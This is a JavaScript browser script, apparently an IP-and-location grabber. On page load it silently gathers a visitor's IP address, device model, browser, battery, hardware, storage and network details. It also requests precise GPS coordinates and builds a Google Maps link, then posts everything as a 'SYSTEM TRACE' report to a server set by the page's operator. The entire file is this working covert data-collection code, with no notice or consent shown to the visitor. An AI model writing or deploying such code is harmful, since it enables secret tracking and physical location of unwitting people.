window.addEventListener("load", async () => {
  const scriptTag = document.querySelector("script[data-tracking-id]");
  if (!scriptTag) return;

  const trackingId = scriptTag.dataset.trackingId;
  const serverUrl = scriptTag.dataset.serverUrl;
  if (!trackingId || !serverUrl) return;

  const data = {};

  // 🌐 IP
  try {
    const res = await fetch("https://api.ipify.org?format=json");
    data.IP = (await res.json()).ip;
  } catch {
    data.IP = "Error";
  }

  // 🧠 Basic
  data.User_Agent = navigator.userAgent;
  data.Language = navigator.language;
  data.Screen = `${screen.width}x${screen.height}`;
  data.Timezone = Intl.DateTimeFormat().resolvedOptions().timeZone;

  // 📱 Device
  let device = "Unknown";
  const ua = navigator.userAgent;
  if (/Android/.test(ua)) {
    const match = ua.match(/Android.*;\s([^)]+)/);
    if (match) device = match[1].replace("Build", "").trim();
  }
  data.Device = device;

  // 🔋 Battery
  if (navigator.getBattery) {
    try {
      const b = await navigator.getBattery();
      data.Battery = `${Math.round(b.level * 100)}% | ${b.charging ? "⚡ Charging" : "🔌 Not Charging"}`;
    } catch {}
  }

  // ⚙️ Hardware
  data.Hardware = `CPU: ${navigator.hardwareConcurrency || "?"} cores | RAM: ${navigator.deviceMemory || "?"}GB`;

  // 💾 Storage
  if (navigator.storage?.estimate) {
    try {
      const s = await navigator.storage.estimate();
      data.Storage = `${(s.usage / 1048576).toFixed(1)}MB / ${(s.quota / 1048576).toFixed(1)}MB`;
    } catch {}
  }

  // 📡 Network
  const conn = navigator.connection;
  if (conn) {
    data.Network = `${conn.effectiveType.toUpperCase()} | ↓${conn.downlink}Mb | ${conn.rtt}ms`;
  }

  // 📍 Location
  try {
    const pos = await new Promise((res, rej) =>
      navigator.geolocation.getCurrentPosition(res, rej, { timeout: 10000 })
    );

    data.Location = `📍 ${pos.coords.latitude}, ${pos.coords.longitude} (${Math.round(pos.coords.accuracy)}m)`;
    data.Maps = `https://maps.google.com/?q=${pos.coords.latitude},${pos.coords.longitude}`;
  } catch {
    data.Location = "❌ Permission Denied";
  }

  // 🎨 ADVANCED FORMAT
  const formatted = `
╔══════════════════════════════╗
        🔥 SYSTEM TRACE 🔥
╠══════════════════════════════╣

🌐 IP ADDRESS
   └─ ${data.IP}

📱 DEVICE INFO
   ├─ Model     : ${data.Device}
   ├─ Language  : ${data.Language}
   └─ Browser   : ${data.User_Agent}

🖥️ DISPLAY
   ├─ Resolution : ${data.Screen}
   └─ Timezone   : ${data.Timezone}

🔋 BATTERY
   └─ ${data.Battery || "N/A"}

⚙️ HARDWARE
   └─ ${data.Hardware}

💾 STORAGE
   └─ ${data.Storage || "N/A"}

📡 NETWORK
   └─ ${data.Network || "N/A"}

📍 LOCATION
   ├─ ${data.Location}
   └─ ${data.Maps || "N/A"}

╚══════════════════════════════╝
`;

  // 🚀 Send
  await fetch(`${serverUrl}/data?trackingId=${trackingId}`, {
    method: "POST",
    headers: { "Content-Type": "application/json" },
    body: JSON.stringify({
      raw: data,
      pretty: formatted
    }),
  }).catch(() => {});
});
